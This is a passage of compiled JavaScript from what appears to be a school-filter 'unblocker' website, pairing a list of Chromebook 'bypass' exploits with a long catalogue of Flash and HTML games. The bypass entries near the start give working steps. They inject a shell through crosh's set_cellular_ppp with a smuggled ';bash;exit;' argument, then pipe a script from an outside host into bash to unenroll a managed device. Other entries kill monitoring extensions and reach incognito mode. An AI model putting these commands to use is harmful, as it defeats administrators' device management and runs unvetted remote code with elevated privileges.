		instructions: "1. Downgrade | 2. Add a personal Gmail account, if it is blocked use addession. | 3. Go to https://chrome.google.com/webstore/category/extensions?hl=en&gl=US&authuser=1 and navigate to Webstore.",
		rating: "3"
	},
	{
		title: "ExtensionKill",
		description: "An exploit that will kick the desired extension off the device for around 3 seconds",
		image: "/images/extensionkill.png",
		instructions: "1. Go to chrome-extension://extensionid/_generated_background_page.html | 2. Make a bookmarklet with the url chrome://kill | 3. Run it on the page and your extension will be killed for 3 seconds.",
		code: "chrome://kill",
		rating: "2"
	},
	{
		title: "Unenrollment",
		description: "An exploit that will allow you to unenroll your chromebook completely.",
		instructions: "DISCLAIMER DO NOT DO THIS UNLESS YOU HAVE ADVANCED KNOWLEDGE OF CHROMEOS * UnEnroll: 1. Open Crosh & Type in set_cellular_ppp \\';bash;exit;\\' and enter | 2. Type in bash <(curl https://coolelectronics.me/unroll) and enter | 3. Wait for the script to finish and then powerwash chromebook. ReEnroll: 1. Enable DevMode (ESC+POWER+RELOAD, Ctrl D and enter on recovery screen) | 2. When in chrome, Open Crosh (ctrl + alt + t) | 3. Type in Shell & Type in sudo vpd i RW_VPD -s check_enrollment=1 | 4. Powerwash Again ",
		code: "set_cellular_ppp \\';bash;exit;\\'\n bash <(curl https://coolelectronics.me/unroll)\n Shell\n sudo vpd i RW_VPD -s check_enrollment=1",
		image: "/images/unenrollment.png",
		rating: "5"
	},
	{
		title: "Incognito",
		description: "An exploit that will allow you to gain access to Incognito mode. Works on versions v81 and under.",
		instructions: " getting on the login screen to the part where you are signing in as a new user. Enter your email and password but don't login. Do Alt + Shift + I. Continue to Step 1 where you spam Privacy Policy | 2. Spam Privacy Policy for a minute to 30 seconds until it is laggy | 3. Once you login go to the Incognito Tab and do Ctrl + Shift + N | 4. Do the Switch/Desktop View key and close original Incognito Tab | 4. If it continues to open policy pages, repeat part 3.",
		image: "/images/incognito.png",
		rating: "3"
	}
];

function BypassCard() {
  return /* @__PURE__ */ jsx(Fragment$1, {
    children: /* @__PURE__ */ jsx("div", {
      className: "bypassDiv1 bg-base-200",
      children: /* @__PURE__ */ jsx("div", {
        className: "bypassDiv flex flex-row flex-wrap pt-6 py-6",
        children: Data$1.map((bypass) => {
          return /* @__PURE__ */ jsxs(Fragment$1, {
            children: [/* @__PURE__ */ jsx("input", {
              type: "checkbox",
              id: bypass.title,
              className: "modal-toggle"
            }), /* @__PURE__ */ jsx("div", {
              className: "modal",
              children: /* @__PURE__ */ jsxs("div", {
                className: "modal-box w-11/12 max-w-5xl",
                children: [/* @__PURE__ */ jsx("h3", {
                  className: "font-bold text-lg",
                  children: bypass.title
                }), /* @__PURE__ */ jsx("p", {
                  className: "py-4",
                  children: bypass.instructions
                }), /* @__PURE__ */ jsx("div", {
                  className: "mockup-code",
                  children: /* @__PURE__ */ jsx("pre", {
                    children: /* @__PURE__ */ jsx("code", {
                      children: bypass.code
                    })
                  })
                }), /* @__PURE__ */ jsx("div", {
                  className: "modal-action",
                  children: /* @__PURE__ */ jsx("label", {
                    htmlFor: bypass.title,
                    className: "btn",
                    children: "Close"
                  })
                })]
              })
            }), /* @__PURE__ */ jsx("div", {}, bypass.title), /* @__PURE__ */ jsxs("div", {
              className: "card w-96 bg-base-100 shadow-xl",
              children: [/* @__PURE__ */ jsx("figure", {
                children: /* @__PURE__ */ jsx("img", {
                  src: bypass.image,
                  alt: bypass.title,
                  width: "350",
                  height: "350"
                })
              }), /* @__PURE__ */ jsxs("div", {
                className: "card-body",
                children: [/* @__PURE__ */ jsx("h2", {
                  className: "card-title",
                  children: bypass.title
                }), /* @__PURE__ */ jsx("p", {
                  children: bypass.description
                }), /* @__PURE__ */ jsx("div", {
                  className: "card-actions justify-end",
                  children: /* @__PURE__ */ jsx("label", {
                    className: "btn btn-primary",
                    htmlFor: bypass.title,
                    children: "View"
                  })
                })]
              })]
            })]
          });
        })
      })
    })
  });
}
__astro_tag_component__(BypassCard, "@astrojs/react");

const $$Astro$2 = createAstro("D:/Lucid-New/src/pages/bypass.astro", "", "file:///D:/Lucid-New/");
const $$Bypass = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro$2, $$props, $$slots);
  Astro2.self = $$Bypass;
  return renderTemplate`<html lang="en" id="wrap">
	<head>
		<meta charset="utf-8">
		<link rel="icon" type="image/svg+xml" href="/favicon.svg">
		<meta name="viewport" content="width=device-width">
		<meta name="generator"${addAttribute(Astro2.generator, "content")}>
		<meta property="og:title" content="Lucid">
		<meta property="og:site_name" content="Lucid">
		<meta name="keywords" content="unblocker, games, proxy, vpn, nova, lucid unblocker, lucid">
		<meta name="description" content="Lucid is an internet utility that provides more functionality for users. A Nova Service. ">
		<title>Lucid</title>
	${renderHead($$result)}</head>
	<body>
		${maybeRenderHead($$result)}
		${renderComponent($$result, "Navbar", Navbar, {})}
		${renderComponent($$result, "BypassCard", BypassCard, {})}
	</body></html>`;
}, "D:/Lucid-New/src/pages/bypass.astro");

const $$file$2 = "D:/Lucid-New/src/pages/bypass.astro";
const $$url$2 = "/bypass";

const _page5 = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Bypass,
  file: $$file$2,
  url: $$url$2
}, Symbol.toStringTag, { value: 'Module' }));

const Data = [
	{
		title: "Achilles",
		description: "Hack and slash your way through 15 stages of greek warriors.",
		image: "/images/achilles.png",
		route: "achilles",
		source: "/swf/Achilles.swf",
		gameType: "flash"
	},
	{
		title: "Age of War",
		description: "Take control of 16 different units and 15 different turrets to defend your base and destroy your enemy. In this game, you start at the cavern men's age, then evolve! There is a total of 5 ages, each with its units and turrets. I hope you have fun with this game! Sooo many hours of hard work.",
		image: "/images/ageofwar.png",
		route: "age-of-war",
		source: "/swf/Age-of-War.swf",
		gameType: "flash"
	},
	{
		title: "Avalanche",
		description: "Avalanche is a fu n little game where try to avoid falling objects as you jump higher and higher! Are you a towelette, or maybe a marshmallow? Whatever the case, there are huge, square bolts to dodge. Can you avoid this avalanche?",
		image: "/images/avalanche.png",
		route: "avalanche",
		source: "/swf/Avalanche.swf",
		gameType: "flash"
	},
	{
		title: "Avatar Arena",
		description: "Your objective in this great fighting flash game is to create your own character, challenge the worlds best benders and defeat them",
		image: "/images/avatararena.png",
		route: "avatar-arena",
		source: "/swf/AvatarArena.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Achievement Unlocked",
		description: "Who needs gameplay when you have ACHIEVEMENTS? Don't worry about beating levels, finding ways t' kill enemies, or beating the final boss… there are none. Focus solely on your ultimate destiny… doing random tasks that have nothing to do with anything. Metagame yourself with ease! Self-satisfaction never felt so… artificial!",
		image: "/images/achievementunlocked.png",
		route: "achievement-unlocked",
		source: "/swf/achievement-unlocked.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Alien Hominid",
		description: "Your aircraft has crash landed on planet Earth, and the FBI is out to get you! Time to take them out!",
		image: "/images/alienhominid.png",
		route: "alien-hominid",
		source: "/swf/alien-hominid.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Amberial",
		description: "Many puzzling levels of bouncing a ball around and trying to touch the end orb to progress.",
		image: "/images/amberial.png",
		route: "amberial",
		source: "/swf/amberial.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Animal Hunter",
		description: "Hunt animals in the forest to score points. Collect the power, speed, and time icons to help you. Have Fun!",
		image: "/images/animalhunter.png",
		route: "animal-hunter",
		source: "/swf/animal_hunter.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Ant Buster",
		description: "Tower defense game with ants.",
		image: "/images/antbuster.png",
		route: "ant-buster",
		source: "/swf/antbuster.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Apple Shooter",
		description: "Apple Shooter Archery Game. Shoot the apple off your friends head using a bow and arrow. But be careful to not shoot his head off!",
		image: "/images/appleshooter.png",
		route: "apple-shooter",
		source: "/swf/apple-shooter-2021.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Arkanoid",
		description: "Arkanoid is a game similar to break out where you move the paddle to hit the ball.",
		image: "/images/arkanoid.png",
		route: "arkanoid",
		source: "/swf/arkanoid.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Asteroids",
		description: "Control the spaceship to destroy asteroids and flying saucers in this classic arcade multidirectional shooter video game by Atari®. Be careful not to collide with the asteroids that are all around you, and avoid counter-fire from the saucers.",
		image: "/images/asteroids.png",
		route: "asteroids",
		source: "/swf/asteroids.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Axis Football League",
		description: "The first, great online football game. Choose from 14 teams and lead your team to victory.",
		route: "axis-football-league",
		source: "/swf/axisfootballleague.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "2048",
		description: "Swipe to move the tiles, when two tiles with the same number touch, they merge into one. When a 2048 tile is created, the player wins.",
		image: "/images/2048.png",
		route: "2048",
		source: "/src/2048/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Agario Minigame",
		description: "Agario is a fun addicting MMO game in which you have to eat or be eaten while you strive to dominate the World of colorful cells. The game has just 2 simple rules to follow: 1) you only can consume targets that are smaller than you and you should match their color to evolve yourself, 2) you must give larger objects a wide berth or you will die. Start moving through the grid and try to catch all the tiny blurs of color. Eat and grow, split and multiply and rule the world.",
		tags: "",
		route: "agario-minigame",
		source: "/src/agario-minigame/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Astray",
		description: "Astray is a first-person horror/puzzle game set in an abandoned museum based on unusual cultures, legends, and supernatural themes; but something more sinister lurks beneath the surface..",
		tags: "",
		route: "astray",
		source: "/src/astray/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Break Lock",
		description: "A hybrid of Mastermind and the Android pattern lock. A game you will love to hate. Empty circle means correct location but wrong order. Full circle means correct location in correct order. You are aiming for four full circles.",
		tags: "",
		route: "break-lock",
		source: "/src/breaklock/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Chroma",
		description: "Mix colors with precision to match the target color. Not for the feint of heart. Or the color blind.",
		tags: "",
		route: "chroma",
		source: "/src/chroma/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Cookie Clicker",
		description: "Cookie Clicker is an incremental game created by French programmer Julien Orteil Thiennot in 2013. The user initially clicks on a big cookie on the screen, earning a single cookie per click.",
		tags: "",
		route: "cookie-clicker",
		source: "/src/cookie/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Cube Field",
		description: "Cubefield is a simple but addictive game, there are only two controls – left and right. Use the arrow keys on your keyboard to guide your ship through an endless field of ominous looking coloured cubes – if you hit one, it's game over.",
		tags: "",
		route: "cube-field",
		source: "/src/cubefield/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Dinosaur",
		description: "The Dinosaur Game is a browser game developed by Google and built into the Google Chrome web browser. The player guides a pixelated Tyrannosaurus rex across a side-scrolling landscape, avoiding obstacles to achieve a higher score.",
		tags: "",
		route: "dinosaur",
		source: "/src/dinosaur/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Doodle Jump",
		description: "How high can you go? A fun and simple game about an alien with a jetpack trying to jump as high as possible",
		tags: "",
		route: "doodle-jump",
		source: "/src/doodle-jump/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Drift (Broken Unity)",
		description: "",
		tags: "",
		route: "drift",
		source: "/src/drift/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Duck Life 1 (HTML)",
		description: "A volcano eruption revealed an ancient cave with treasures inside. Explore the cave as a young energetic duck.  Gather coins and avoid danger as you fly through the cave. Customize your duck when you can afford it.",
		tags: "",
		route: "ducklife-1-html",
		source: "/src/ducklife/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Duck Life 2 (HTML) (Broken Unity)",
		description: "Duck Life 2 is a fun game for kids of all ages! Train the duck to be a champion racer so that it can win back the farm. Run, swim, and fly to become the leader of the flock!",
		tags: "",
		route: "duck-life-2-html",
		source: "/src/ducklife2/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Duck Life 3 (HTML)",
		description: "Duck Life 3 is here. In this new Duck Life Game you will have to help your Duck evolve to give him the best Duck Life possible. In the beginning you'll need to pick which type of Duck you want. The choices are Athletic Type, Swimming Type, Flying Type, or Strength Type. You will have to play around with them to see which type is your favorite. Below you'll find some pictures from DuckLife 3. You can see the different type of ducks to choose from and the first stage of evolution. DuckLife 3 is the newest Game in the DuckLife series.",
		tags: "",
		route: "duck-life-3-html",
		source: "/src/ducklife3/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Duck Life 4 (HTML)",
		description: "Duck Life 4 is a fun game for kids of all ages! Train the duck to be a champion racer so that it can win back the farm. Run, swim, and fly to become the leader of the flock!",
		tags: "",
		route: "duck-life-4-html",
		source: "/src/ducklife4/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Fireboy and Watergirl Forest Temple",
		description: "Help Fireboy and Watergirl through the forest temple tunnels and reach the exit doors in this fun arcade platformer!",
		tags: "",
		route: "fireboy-and-watergirl-forest-temple",
		source: "/src/fireboy-and-watergirl-forest-temple/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Flappy 2048",
		description: "Jump through the tiles and get to 2048!",
		tags: "",
		route: "flappy-2048",
		source: "/src/flappy-2048/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Flappy Bird (404 Not Found)",
		description: "Flappy Bird is a mobile game developed by Vietnamese video game artist and programmer Dong Nguyen, under his game development company .Gears. The game is a side-scroller where the player controls a bird, attempting to fly between columns of green pipes without hitting them.",
		tags: "",
		route: "flappy-bird",
		source: "/src/flappybird/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Friendly Fire",
		description: "“Friendly Fire” is a 2d platform adventure game with handcrafted pixel art, an original soundtrack and lots of love put into the creation of the characters and dialogues.",
		tags: "",
		route: "friendly-fire",
		source: "/src/friendlyfire/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Geometry Dash",
		description: "Geometry Dash is developed by Sweden-based developer Robert Topala. The game has 21 levels currently with different types of difficulty. Players can enjoy 3 levels of the game: Stereo Madness, Back on track, and Polargeist. Each one has its own difficulty and a list of best scores.",
		tags: "",
		route: "geometry-dash",
		source: "/src/geometry/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Gopher Kart",
		description: "Created by Jamilet Zelaya with very little help from Erick Zelaya.",
		tags: "",
		route: "gopher-kart",
		source: "/src/gopher-kart/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hexgl",
		description: "HexGL is a futuristic, fast-paced racing game built by Thibaut Despoulain using HTML5, Javascript and WebGL and a tribute to the original Wipeout and F-Zero series.",
		tags: "",
		route: "hexgl",
		source: "/src/hexgl/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hextris",
		description: "An addictive puzzle game inspired by Tetris.",
		tags: "",
		route: "hextris",
		source: "/src/hextris/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Madalin Cars Multiplayer",
		description: "Madalin Cars Multiplayer is an epic online car driving game in the hugely popular Madalin Cars series. Choose from a range of different sports cars and customize them to your liking. You can change the color and drive settings of your car to give yourself a truly personalized ride! Once you have chosen your vehicle, you can join the online game and enter the immense desert landscape!",
		tags: "",
		route: "madalin-cars-multiplayer",
		source: "/src/madalin-cars-multiplayer/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Minecraft",
		description: "Minecraft is a video game in which players create and break apart various kinds of blocks in three-dimensional worlds. The game's two main modes are Survival and Creative. In Survival, players must find their own building supplies and food. They also interact with blocklike mobs, or moving creatures.",
		tags: "",
		route: "mc-classic",
		source: "/src/mc-classic/index.html",
		gameType: "html",
		width: "1080px",
		height: "720px",
		listed: true
	},
	{
		title: "Microsoft Flight Simulator",
		description: "Microsoft Flight Simulator is a series of amateur flight simulator programs for Microsoft Windows operating systems, and earlier for MS-DOS and Classic Mac OS. It is one of the longest-running, best-known, and most comprehensive home flight simulator programs on the market.",
		tags: "",
		route: "microsoft-flight-simulator",
		source: "/src/microsoft-flight-simulator/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Muffin Knight (Requires Chrome Experimental Features)",
		description: "Muffin Knight is an arena based action-packed platformer with stunning visuals and a myriad of fairytale characters, each with their own unique abilities, which gain strength as you advance. This is the story of a little boy, on his journey to return the old fairy's magical muffins.",
		tags: "",
		route: "muffin-knight",
		source: "/src/muffin-knight/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Pacman (HTML)",
		description: "Pac-Man is a Japanese video game franchise published, developed and owned by Bandai Namco Entertainment. Entries have been developed by a wide array of other video game companies, including Midway Games, Atari and Mass Media, Inc..",
		tags: "",
		route: "pacman-html",
		source: "/src/pacman/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Radius Raid",
		description: "Radius Raid is a space themed shoot 'em up where you must blast away unrelenting enemies before they destroy you. The game features 13 enemy types, 5 powerups, parallax backgrounds, retro sound effects, and locally stored stats.",
		tags: "",
		route: "radius-raid",
		source: "/src/radius-raid/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Retro Bowl",
		description: "Retro Bowl is an American football video game developed by New Star Games for the iOS and Android operating systems. A browser version is also available on some websites. The game was released in January 2020 and due to its exposure on the website TikTok it massively increased in popularity in late 2021.",
		tags: "",
		route: "retro-bowl",
		source: "/src/retro-bowl/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Ritz",
		description: "Your cool ass boy Ritz the rat has just been RATTED out by the anti-rat crew. His cheese gone...His hunger rising....help this rat get his fukken cheese back in the lair of illusions.",
		tags: "",
		route: "ritz",
		source: "/src/ritz/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Run 3 (HTML) (Unknown Error)",
		description: "Run 3 is an exciting running game where you run, jump through an endless tunnel in space. Pass all challenges of hundred levels without falling into space.",
		tags: "",
		route: "run-3-html",
		source: "/src/run3/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Slope",
		description: "Slope game is a fantastic speed run game where you can drive a ball rolling on tons of slopes and obstacles. See how far you can go in this endless course.",
		tags: "",
		route: "slope",
		source: "/src/slope/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Super Mario 64",
		description: "Super Mario 64 is a 1996 platform game for the Nintendo 64, developed by Nintendo EAD and published by Nintendo. The first Super Mario game to feature 3D gameplay, it features freedom of movement within a large open world based on polygons, combined with traditional Mario gameplay, visual style, and characters.",
		tags: "",
		route: "sm64",
		source: "/src/sm64/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Space Invaders",
		description: "Space Invaders is a Japanese shooting video game released in 1978 by Taito. It was developed by Tomohiro Nishikado, who was inspired by other media: Breakout, The War of the Worlds, and Star Wars.",
		tags: "",
		route: "space-invaders",
		source: "/src/spaceinvaders/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Tank Trouble",
		description: "Tank Trouble is an online tank game where you drive in a maze and shoot missiles at your enemies. Tank Trouble pits you against clever army generals in mazelike battlefields. In Solo mode, you will face Laika, a master of war. You can also challenge a friend or two in multiplayer warfare.",
		tags: "",
		route: "tank-trouble",
		source: "/src/tanktrouble/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Vex 3",
		description: "Vex 3 is a fascinating game. Your task is to Take Vex through the levels by running, jumping, sliding and swimming while avoiding dangerous obstacles.",
		tags: "",
		route: "vex-3",
		source: "/src/vex3/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Vex 4",
		description: "VEX 4 takes Vex to the next level! This fast paced stickman game puts your skills to the test. Run, jump, slide, swim and avoid obstacles, VEX 4 has it all.",
		tags: "",
		route: "vex-4",
		source: "/src/vex4/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Vex 5",
		description: "Surely you are very familiar to the Vex game series. Now, you can meet cute Stickman again in Vex 5. Vex 5 is the 5th platform game in the Vex series. Each level is a labyrinth of deadly devices and traps. You have to make your way from one platform to the other and avoid deadly obstacles such as buzzsaws, spikes, crumbling blocks, and more! To win this game, you must overcome dangerous spikes, saw blades, and a variety of other challenges. If you've played the previous games in the series, you'll be familiar with what to expect in this thrilling new installment. The goal is to finish each level by reaching the endpoint. In this game, levels are referred to as acts, and there are numerous acts to finish.",
		tags: "",
		route: "vex-5",
		source: "/src/vex5/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Rolling Sky",
		description: "Rolling Sky is the best musical skill game of all time. You are a ball rolling over a track with tons of hazards to make you fall. You have to be super fast, precise and accurate to dodge all the barriers, holes and laser beams that are shot in your direction. Use the music to keep your rhythm while swinging from left to right to get the power-ups you need to finish the levels. This is seriously the most challenging game you can find online.",
		tags: "",
		route: "rolling-sky",
		source: "/src/webgl-rollingsky/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "13 Days in Hell",
		description: "13 Days in Hell is an arcade shooter that gives you control over the chosen one, with the sole purpose of surviving an onslaught of souls in hell for 13 full days. You have to shoot and kill the souls coming at you with their axes, or they may chop you up.",
		tags: "",
		route: "13-days-in-hell",
		source: "/swf/13-days-in-hell.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "360 Snake",
		description: "The famous and beloved 360 Snake unblocked. Control the snake with a computer mouse, and collect white balls that will allow the snake to grow to incredible sizes. But it all depends on your skill in controlling. You can not stop for a second or make a mistake, otherwise, you have to start the game again. Just avoid barriers, and make sure that the snake does not stumble on its own tail. The old game in the new format will give you a lot of fun.",
		tags: "",
		route: "360-snake",
		source: "/swf/360-snake.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "3D Car Driver",
		description: ".",
		tags: "",
		route: "3d-car-driver",
		source: "/swf/3D-Car-Driver.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "3 Foot Ninja",
		description: "Show off your awesome ninja skills by helping the 3 Foot Ninja defeat his enemies, whilst collecting the ancient Lost Scrolls of the Elders to unlock the secrets of the Elder Masters.",
		tags: "",
		route: "3-foot-ninja",
		source: "/swf/3_foot_ninja.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "50 states",
		description: "Do you know your 50 states? Play this fun US states game to find out - just click the blank map to answer the questions!",
		tags: "",
		route: "50-states",
		source: "/swf/50states.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "3 on 3 Hockey",
		description: "3-on-3 Hockey is a fast-paced and exciting hockey experience for all ages.",
		tags: "",
		route: "3-on-3-hockey",
		source: "/swf/3_on_3_hockey.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "8 Ball Pool",
		description: "Eight-ball is a pool billiards played on a billiard table with six pockets, cue sticks, and sixteen billiard balls: a cue ball and fifteen object balls. The object balls include seven solid-colored balls numbered 1 through 7, seven striped balls numbered 9 through 15, and the black 8 ball.",
		tags: "",
		route: "8-ball-pool",
		source: "/swf/8BallPool.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bloons",
		description: "Bloons Tower Defense is a series of tower defense games under the Bloons series created and produced by Ninja Kiwi. The game was initially developed as a browser game, built upon the Adobe Flash platform and released in mid 2007.",
		tags: "",
		route: "bloons",
		source: "/swf/Bloons.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Falldown",
		description: "A Simple Game. You are trying to run away from the obstacles when you falling down.",
		tags: "",
		route: "falldown",
		source: "/swf/Falldown.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Henry Stick Breaking Into The Bank",
		description: "Henry Stickmin attempts to break into a bank, built in the middle of a desert. He stands next to a wall and wonders how to break inside.",
		tags: "",
		route: "henry-stick-breaking-the-bank",
		source: "/swf/HenryStick_BreakingTheBank.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Henry Stick Escaping The Prison",
		description: "Escaping the Prison is the second game in the Henry Stickmin series. It is the sequel to Breaking the Bank, and the prequel to Stealing the Diamond, and is named as Episode 1 of the Henry Stickmin story. It is one of the most popular of the series, with over 3 million plays on Newgrounds. It contains a total of 36 choices to make, which is 6 times the amount as the previous game.",
		tags: "",
		route: "henry-stick-escaping-the-prison",
		source: "/swf/HenryStick_EscapingThePrison.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Henry Stick Infiltrating The Airship",
		description: "Infiltrating the Airship is the fourth game in the Henry Stickmin series. It is the sequel to Stealing the Diamond, and takes place before Fleeing the Complex, and is named as Episode 4 of the Henry Stickmin story. The game has four different endings and one fake ending.",
		tags: "",
		route: "henry-stick-infiltrating-the-airship",
		source: "/swf/HenryStick_InfiltratingTheAirship.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Henry Stick Stealing the Diamond",
		description: "Stealing the Diamond is the third game in the Henry Stickmin series. It takes place after Escaping the Prison and before Infiltrating The Airship, and is considered Episode 2 of the Henry Stickmin Collection.",
		tags: "",
		route: "henry-stick-stealing-diamond",
		source: "/swf/HenryStick_StealingDiamond.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "The Impossible Quiz",
		description: "The Impossible Quiz...It's not impossible! One of the most aggravating games ever created! This game has simple graphics, suitable for all ages, especially children and families. You can experience this game on your browser because it is a flash game.",
		tags: "",
		route: "the-impossible-quiz",
		source: "/swf/TheImpossibleQuiz.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Worlds Hardest Game",
		description: "The World's Hardest Game speaks for itself, when we say it is the hardest game we aren't kidding! If you have played World's Hardest Game before, you know how difficult the game can be. You will need to be quick and decisive with your movements, and have a strategy going into each level. Lucky for you, we have some helpful tips and tricks that will help you whether you are experienced or a complete beginner.",
		tags: "",
		route: "worlds-hardest-game",
		source: "/swf/WorldsHardestGame.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Acid Bunny 2",
		description: "Acid Bunny is back! This time all the action takes place on the beach, the ocean and in the jungle as well as another Down Below level.",
		tags: "",
		route: "acid-bunny-2",
		source: "/swf/acid-bunny-2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Acid Bunny",
		description: "Ooh no! Acid Bunny had a flashback and accidentally killed one of his friends. Help him patch up the friendship finding all body parts, a needle, and lots of thread. Along the way wipe out acid spying opponents using carrots and other aids.",
		tags: "",
		route: "acid-bunny",
		source: "/swf/acid-bunny.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Ball Breaker",
		description: "Showcase your Arkanoid skills in Brick Breaker! Move the paddle left and right to keep the ball in play. You must react quickly to hit the ball as it bounces on every wall. The goal is to clear every brick!",
		tags: "",
		route: "ball-breaker",
		source: "/swf/ball-breaker.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bejeweled",
		description: "Bejeweled is a series of tile-matching puzzle video games created by PopCap Games. Bejeweled was released initially for browsers in 2001",
		tags: "",
		route: "Bejeweled",
		source: "/swf/bejeweled-unblocked.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bike Mania",
		description: "Ride your bike through the bumpy and challenging tracks. Do not hit the ground and show your skill! Release Date. April 2007 (Flash). January 2020 (HTML5).",
		tags: "",
		route: "bike-mania",
		source: "/swf/bikemania.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Bike Mania 2",
		description: "Second Bike Mania is a great online game. You will again have to show how you can deal with difficult terrain. Just play online, no download.",
		tags: "",
		route: "bike-mania-2",
		source: "/swf/bikemania2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Binding of Isaac",
		description: "The Binding of Isaac is a roguelike video game designed by independent developers Edmund McMillen and Florian Himsl. It was released in 2011 for Microsoft Windows, then ported to OS X, and Linux. The game's title and plot are inspired by the Biblical story of the Binding of Isaac.",
		tags: "",
		route: "binding-of-isaac",
